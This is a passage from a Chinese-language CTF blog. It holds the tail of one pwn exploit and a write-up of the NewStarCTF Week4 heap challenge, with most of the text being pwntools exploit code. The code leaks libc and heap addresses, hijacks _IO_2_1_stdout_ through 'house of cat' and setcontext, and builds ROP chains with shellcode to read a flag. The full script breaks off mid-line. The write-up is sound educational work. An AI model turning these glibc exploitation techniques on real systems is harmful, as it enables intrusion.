p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    l = <span class="hljs-built_in">len</span>(pay)<br>    pay = <span class="hljs-built_in">int</span>.from_bytes(pay, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-comment">#print(hex(libcbase))</span><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>syscall_ret = libcbase + <span class="hljs-number">0xd2625</span><br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>pop_rsi = libcbase + <span class="hljs-number">0x23a6a</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b96</span><br>pop_rax = libcbase + <span class="hljs-number">0x1b500</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x820</span><br><br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x200</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xa0</span> + p64(heap_addr + <span class="hljs-number">0x1140</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr + <span class="hljs-number">0x1000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x1350</span>)<br>edit(<span class="hljs-number">4</span>, key(payload))<br><br>shellcode = <span class="hljs-string">&#x27;int 3&#x27;</span> + shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode = asm(shellcode)<br>edit(<span class="hljs-number">5</span>, key(shellcode))<br><br>edit(<span class="hljs-number">3</span>, key(p64(setcontext + <span class="hljs-number">53</span>)))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>).encode())<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ctftimeä¸Šå…³äºSandyboxçš„wpï¼š<a href="https://ctftime.org/writeup/20115">https://ctftime.org/writeup/20115</a></p><p>å®é™…ä¸Šptraceå‡½æ•°è¿˜æœ‰å…¶å®ƒæ›´å¤šçš„åŠŸèƒ½ï¼Œå…·ä½“è¯·çœ‹ï¼š<a href="https://www.anquanke.com/post/id/231078">https://www.anquanke.com/post/id/231078</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF å…¬å¼€èµ›Week4 pwn è¿™æ˜¯å †ğŸ</title>
    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF å…¬å¼€èµ›Week4 pwn è¿™æ˜¯å †ğŸ</p><p>é¢˜ç›®ç¯å¢ƒï¼šglibc-2.31</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¦–å…ˆçœ‹åˆ°é¢˜ç›®è°ƒç”¨äº†prctlå‡½æ•°ï¼Œè¯´æ˜å¼€äº†æ²™ç›’ä¿æŠ¤æœºåˆ¶ã€‚ä½¿ç”¨seccomp-toolsæ£€æŸ¥ä¸€ä¸‹</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>å‘ç°é¢˜ç›®ç¦æ­¢äº†execveçš„ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°è¦ç”¨orwå°†flagè¯»å–å‡ºæ¥ï¼›ä½†è¿™é¢˜è¿˜æŠŠopenå‡½æ•°ç»™ç¦ç”¨äº†ï¼ˆæ˜¯ä¸æ˜¯å¾ˆæ— è¯­ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç³»ç»Ÿè°ƒç”¨openatå‡½æ•°å»æ‰“å¼€æ–‡ä»¶ï¼Œopenatå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º257ã€‚ </p><p>â€‹                                                                                                     </p><p>Addå‡½æ•°ç”³è¯·å †å—ï¼ŒDeleå‡½æ•°å’ŒShowå‡½æ•°å°±ä¸€å¥ç®€å•çš„putsè¾“å‡ºã€‚</p><p>å†å»çœ‹çœ‹Editå‡½æ•°ï¼Œå¯¹v1é‡‡ç”¨intç±»å‹å»å®šä¹‰çš„ï¼Œæ²¡æœ‰å¯¹è´Ÿæ•°è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å»ä¿®æ”¹é™¤å †ä»¥å¤–çš„å…¶å®ƒåœ°æ–¹ã€‚</p><p><img src="/img/2/1667357538953.png"></p><p>è¿›ä¸€æ­¥æŸ¥çœ‹è¿è¡Œæ—¶å…¨å±€å˜é‡heapsåœ¨bssæ®µçš„æ•°æ®ï¼Œå‘ç°å­˜åœ¨IO_FILEçš„åœ°å€ï¼Œå¯ä»¥è¾“å…¥è´Ÿæ•°ç„¶åç›´æ¥ä¿®æ”¹_IO_FILEå½“ä¸­çš„å€¼ã€‚</p><img src="/img/2/1667359698418.jpg" style="zoom: 80%;" /><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>å¯ä»¥ä½¿ç”¨shellcodeå»æ‰§è¡Œorwå°†flagè¯»å–å‡ºæ¥ï¼Œå½“ç„¶å‰ææ˜¯æ³„æ¼å †åœ°å€ï¼Œç„¶åä½¿ç”¨mprotectå‡½æ•°æ›´æ”¹å †åœ°å€çš„æ‰§è¡Œæƒé™ï¼Œç”±äºç¨‹åºæœ€åˆå¹¶æ²¡æœ‰ç»™ç¡®å®šåœ°å€çš„å¯æ‰§è¡Œæ®µï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒrspå¯„å­˜å™¨å…ˆæ‰§è¡Œmprotectå‡½æ•°çš„ROPï¼Œæ‰èƒ½è¿›ä¸€æ­¥å»è°ƒç”¨shellcodeï¼›æˆ–è€…ç›´æ¥åŠ«æŒrspå¯„å­˜å™¨ä½¿ç”¨openã€readã€writeå‡½æ•°çš„ROPæ¥å®ç°orwã€‚è¿™é‡Œæˆ‘é‡‡ç”¨åè€…ã€‚</p><p>ç¨‹åºä¸­çš„gadgetè‚¯å®šæ˜¯ä¸å¤Ÿæˆ‘ä»¬å»å®ç°ROPçš„ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨libcä¸­çš„gadgetã€‚</p><p>è¦æ§åˆ¶rspæ‰å¯ä»¥å»ROPï¼Œlibcä¸­å¯ä»¥å»æ‰§è¡Œsetcontextä¸­çš„ä»£ç æ§åˆ¶rspï¼ˆå…·ä½“è§æˆ‘çš„Dest0g3 520è¿æ–°èµ› pwn ez_kiwiè¿™ç¯‡æ–‡ç« ï¼‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹_IO_FILEå½“ä¸­çš„å€¼ï¼Œå°±æƒ³åŠæ³•åŠ«æŒå…¶ä¸­çš„æ§åˆ¶æµï¼Œæ¥æ‰§è¡Œsetcontextã€‚</p><h3 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h3><h5 id="æ³„æ¼libc"><a href="#æ³„æ¼libc" class="headerlink" title="æ³„æ¼libc"></a>æ³„æ¼libc</h5><p>è¿™é‡Œæˆ‘ä»¬å°±å»ä¿®æ”¹æ ‡å‡†è¾“å‡º<code>_IO_2_1_stdout_</code>ä¸­çš„å€¼é¦–å…ˆæ³„æ¼libcçš„åŸºå€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ROPgadget æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œ<code>syscall ret</code>è¿™ä¸ªgeagetå¯ä»¥ä½¿ç”¨æ“ä½œç å»å¯»æ‰¾ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜è¦å¯»æ‰¾ï¼š</p><p><code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></p><p>setcontextä¸­åŠ«æŒrspæ˜¯é€šè¿‡rdxæ¥ä¿®æ”¹çš„ï¼Œä½†æ˜¯åœ¨putså‡½æ•°çš„è°ƒç”¨ä¸­æˆ‘ä»¬æ— æ³•å»æ§åˆ¶rdxï¼›ä½¿ç”¨è¿™ä¸ªgadgetï¼ˆå®ƒæ˜¯getkeyserv_handleå‡½æ•°å…¶ä¸­çš„ä¸€æ®µï¼‰ï¼Œä¸ºæˆ‘ä»¬åŠ«æŒæ§åˆ¶æµæä¾›äº†å¾ˆå¥½çš„å¸®åŠ©ã€‚</p><h5 id="æ³„æ¼å †åœ°å€"><a href="#æ³„æ¼å †åœ°å€" class="headerlink" title="æ³„æ¼å †åœ°å€"></a>æ³„æ¼å †åœ°å€</h5><p>å­˜æ”¾gadgetï¼Œå †æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œåœ¨libcä¸­mpç»“æ„å°±å­˜æ”¾äº†å †åœ°å€ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨ç›¸åŒçš„æ–¹å¼å»æ³„æ¼å †åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="åŠ«æŒæ§åˆ¶æµ"><a href="#åŠ«æŒæ§åˆ¶æµ" class="headerlink" title="åŠ«æŒæ§åˆ¶æµ"></a>åŠ«æŒæ§åˆ¶æµ</h5><p>æ‰§è¡Œputså‡½æ•°ï¼Œä¼šé€šè¿‡æ‰¾åˆ°<code>_IO_2_1_stdout_</code>çš„<code>_IO_file_jumps</code>ä¸­çš„åç§»ï¼Œå»æ‰§è¡Œ<code>_IO_file_xsputn</code>å‡½æ•°ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¿®æ”¹<code>_IO_2_1_stdout_</code>çš„<code>_IO_file_jumps</code>ï¼Œ  è®©å…¶æœ€ç»ˆæ‰§è¡Œå…¶å®ƒå‡½æ•°ã€‚<code>_IO_file_jumps</code> å¹¶ä¸èƒ½æ”¹æˆä»»æ„åœ°å€ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šå¯¹å…¶åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚</p><p>è¿™é‡Œæˆ‘é‡‡ç”¨house of cat</p><p>è®©å…¶è°ƒç”¨<code>_IO_wfile_jumps</code>ä¸­çš„<code>_IO_wfile_seekoff</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥åˆ°<code>_IO_switch_to_wget_mode</code>å‡½æ•°å»æ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼ˆç®€å†™ï¼‰ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>åŠ«æŒåˆ°_IO_wfile_jumpsï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="/img/2/1667369851498.jpg" style="zoom: 67%;" /><p>_IO_switch_to_wget_modeå‡½æ•°ä¸­å…·ä½“å®ç°ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="/img/2/1667370258241.jpg" style="zoom: 67%;" /><p>åœ¨è¿™è¿‡ç¨‹ä¸­rdiå¯„å­˜å™¨å§‹ç»ˆæ˜¯<code>_IO_2_1_stdout_</code>çš„åœ°å€ï¼Œ è®©å…¶æœ€åæ‰§è¡Œï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<br></code></pre></td></tr></table></figure><p>é€šè¿‡rdiçš„å€¼å»æ§åˆ¶rdxï¼Œå¹¶å»æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯å»æ‰§è¡Œsetcontext åŠ«æŒrspå¯„å­˜å™¨æŒ‡å‘å †åœ°å€ã€‚</p><p>æ”¹å†™<code>_IO_2_1_stdout_</code>æ„é€ å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>å†™å…¥å †ä¸­çš„æ•°æ®è¦æ³¨æ„setcontextçš„æ‰§è¡Œ ä¸orwä¸­gadgetçš„ä½ç½®ï¼Œå…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = 